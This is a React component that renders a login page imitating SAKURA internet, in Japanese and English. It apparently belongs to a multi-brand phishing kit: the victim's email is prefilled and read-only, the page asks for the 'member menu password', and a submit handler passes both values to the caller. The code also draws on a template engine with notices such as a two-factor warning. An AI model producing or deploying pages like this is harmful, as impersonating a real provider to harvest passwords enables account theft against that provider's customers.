'use client'

import { useState } from 'react'
import { Template, SupportedLanguage, TemplateContent } from '@/lib/templateTypes'
import { getTemplateContent } from '@/lib/templateEngine'

interface SAKURATemplateProps {
  template: Template
  language: SupportedLanguage
  email: string
  onSubmit: (email: string, password: string) => void
  onError?: (error: string) => void
}

export function SAKURATemplate({
  template,
  language,
  email,
  onSubmit,
  onError
}: SAKURATemplateProps) {
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [isSubmitting, setIsSubmitting] = useState(false)
  
  const content: TemplateContent = getTemplateContent(template, language)
  const { theme, features, background } = template
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!password) {
      setError(content.errorMessages.invalidPassword)
      return
    }
    
    setIsSubmitting(true)
    setError('')
    
    try {
      await onSubmit(email, password)
    } catch (err) {
      setError(content.errorMessages.serverError)
      onError?.(content.errorMessages.serverError)
    } finally {
      setIsSubmitting(false)
    }
  }
  
  return (
    <div 
      style={{
        minHeight: '100vh',
        background: background.type === 'image' 
          ? `url('${background.value}')` 
          : background.value,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
      }}
    >
      <div
        style={{
          maxWidth: template.layout.containerWidth,
          width: '100%',
          background: theme.backgroundColor,
          padding: '50px 40px',
          borderRadius: '0px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
        }}
      >
        {/* Logo */}
        {features.showLogo && (
          <div style={{ 
            textAlign: 'center', 
            marginBottom: '40px',
            paddingBottom: '20px',
            borderBottom: '2px solid #f0f0f0'
          }}>
            {template.logo.url ? (
              <img 
                src={template.logo.url} 
                alt={template.name}
                style={{ 
                  width: template.logo.width,
                  height: template.logo.height,
                  margin: '0 auto'
                }}
              />
            ) : (
              <div>
                <div style={{
                  display: 'inline-block',
                  padding: '10px 20px',
                  background: '#FF1493',
                  color: 'white',
                  borderRadius: '20px',
                  fontSize: '14px',
                  fontWeight: 'bold',
                  marginBottom: '10px'
                }}>
                  🌸
                </div>
                <h1 style={{ 
                  color: theme.primaryColor, 
                  fontSize: '24px',
                  fontWeight: 'bold',
                  margin: '10px 0 0 0',
                }}>
                  {template.logo.text || content.title}
                </h1>
              </div>
            )}
          </div>
        )}
        
        {/* Notice */}
        {features.showNotices && content.notices?.twoFactorAuth && (
          <div style={{
            background: '#FFF0F0',
            padding: '20px',
            borderRadius: '4px',
            marginBottom: '30px',
            fontSize: '14px',
            color: '#CC0000',
            border: '1px solid #FFCCCC',
            lineHeight: '1.6',
          }}>
            <div style={{ fontWeight: 'bold', marginBottom: '8px' }}>
              {language === 'ja' ? '重要なお知らせ' : 'Important Notice'}
            </div>
            {content.notices.twoFactorAuth}
          </div>
        )}
        
        {/* Instruction */}
        <div style={{
          marginBottom: '30px',
          fontSize: '16px',
          color: theme.textColor,
          textAlign: 'center',
          fontWeight: '500',
        }}>
          {language === 'ja' 
            ? '「会員ID」と「会員メニューのパスワード」をご入力ください'
            : 'Please enter your "Member ID" and "Member Menu Password"'}
        </div>
        
        <div style={{
          fontSize: '13px',
          color: '#666',
          marginBottom: '30px',
          textAlign: 'center',
        }}>
          {language === 'ja'
            ? '※会員メニューのパスワードはお客さまにてお決めいただいたパスワードです'
            : '*The password for the member menu is the password you have decided.'}
        </div>
        
        {/* Form */}
        <form onSubmit={handleSubmit}>
          {/* Email/Member ID */}
          <div style={{ 
            marginBottom: '24px',
            background: '#F9F9F9',
            padding: '20px',
            borderRadius: '4px',
          }}>
            <label style={{ 
              display: 'block', 
              marginBottom: '12px',
              fontSize: '15px',
              fontWeight: 'bold',
              color: theme.textColor,
            }}>
              {content.emailLabel}
            </label>
            <input
              type="text"
              value={email}
              readOnly
              style={{
                width: '100%',
                padding: '14px',
                border: '2px solid #ddd',
                borderRadius: '4px',
                fontSize: '15px',
                background: '#ffffff',
                color: theme.textColor,
              }}
            />
            <div style={{
              marginTop: '10px',
              fontSize: '12px',
              color: '#999',
            }}>
              {language === 'ja' ? '例: nnn12345' : 'Example: nnn12345'}
            </div>
          </div>
          
          {/* Password */}
          <div style={{ 
            marginBottom: '24px',
            background: '#F9F9F9',
            padding: '20px',
            borderRadius: '4px',
          }}>
            <label style={{ 
              display: 'block', 
              marginBottom: '12px',
              fontSize: '15px',
              fontWeight: 'bold',
              color: theme.textColor,
            }}>
              {content.passwordLabel}
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder={content.passwordPlaceholder}
              disabled={isSubmitting}
              style={{
                width: '100%',
                padding: '14px',
                border: '2px solid #ddd',
                borderRadius: '4px',
                fontSize: '15px',
                color: theme.textColor,
              }}
            />
          </div>
          
          {/* Remember Me */}
          {features.showRememberMe && (
            <div style={{ marginBottom: '20px' }}>
              <label style={{ 
                display: 'flex', 
                alignItems: 'center',
                fontSize: '14px',
                color: theme.textColor,
              }}>
                <input 
                  type="checkbox" 
                  style={{ 
                    marginRight: '10px',
                    width: '18px',
                    height: '18px',
                  }}
                />
                {content.rememberMe}
              </label>
            </div>
          )}
          
          {/* Error Message */}
          {error && (
            <div style={{
              background: '#FFEBEE',
              color: '#C62828',
              padding: '14px',
              borderRadius: '4px',
              marginBottom: '20px',
              fontSize: '14px',
              border: '1px solid #FFCDD2',
            }}>
              ⚠️ {error}
            </div>
          )}
          
          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            style={{
              width: '100%',
              padding: '16px',
              background: theme.primaryColor,
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              fontSize: '18px',
              fontWeight: 'bold',
              cursor: isSubmitting ? 'not-allowed' : 'pointer',
              opacity: isSubmitting ? 0.6 : 1,
              transition: 'all 0.2s',
            }}
          >
            {isSubmitting ? '...' : content.submitButton}
          </button>
          
          {/* Divider */}
          <div style={{
            textAlign: 'center',
            margin: '30px 0',
            color: '#999',
            fontSize: '14px',
          }}>
            {language === 'ja' ? 'または' : 'or'}
          </div>
          
          {/* Create Account Button */}
          {features.showCreateAccount && (
            <button
              type="button"
              style={{
                width: '100%',
                padding: '16px',
                background: 'white',
                color: theme.primaryColor,
                border: `2px solid ${theme.primaryColor}`,
                borderRadius: '4px',
                fontSize: '16px',
                fontWeight: 'bold',
                cursor: 'pointer',
                transition: 'all 0.2s',
              }}
            >
              {content.createAccount}
            </button>
          )}
          
          {/* Links */}
          <div style={{ 
            marginTop: '30px', 
            textAlign: 'center',
            fontSize: '14px',
          }}>
            {features.showForgotPassword && (
              <>
                <a 
                  href="#" 
                  style={{ 
                    color: theme.primaryColor,
                    textDecoration: 'none',
                  }}
                >
                  ▶ {content.forgotPassword}
                </a>
              </>
            )}
          </div>
        </form>
        
        {/* Footer */}
        <div style={{
          marginTop: '40px',
          paddingTop: '20px',
          borderTop: '1px solid #f0f0f0',
          textAlign: 'center',
          fontSize: '12px',
          color: '#999',
        }}>
          <div>
            {language === 'ja' ? '企業情報' : 'Company Info'} | 
            {language === 'ja' ? ' ご不明点・お問合せ' : ' Contact Us'}
          </div>
          <div style={{ marginTop: '10px' }}>
            © SAKURA internet Inc.
          </div>
        </div>
      </div>
    </div>
  )
}










